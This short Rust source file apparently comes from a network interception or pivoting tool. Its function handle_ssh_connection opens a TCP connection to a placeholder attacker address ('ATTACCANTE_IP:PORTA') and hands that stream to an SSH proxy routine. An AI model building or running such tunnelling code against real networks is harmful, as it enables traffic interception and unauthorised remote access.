use pnet::datalink::DataLinkSender;
use tokio::net::TcpStream;
use crate::proxy::ssh::start_ssh_proxy;

pub async fn handle_ssh_connection(
    tx: &mut dyn DataLinkSender,
){
    let local_stream = TcpStream::connect("ATTACCANTE_IP:PORTA").await.expect("Failed creating local stream proxy");

    let _ = start_ssh_proxy(local_stream).await;

    return;
}